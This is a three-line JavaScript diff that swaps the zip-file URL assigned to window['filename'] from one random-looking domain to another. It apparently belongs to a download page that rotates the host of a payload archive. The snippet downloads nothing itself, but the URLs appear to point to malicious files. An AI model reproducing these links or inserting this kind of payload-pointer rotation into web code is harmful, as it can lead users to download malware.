@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'https://reowasiu-s3oss.online/Txs_Rwsaletsvpnd15s.zip';
+    window['filename'] = 'https://risanhs-sdad1e4asd-3css3hub.xyz/Celsica-Letsvp.zip';
 })();
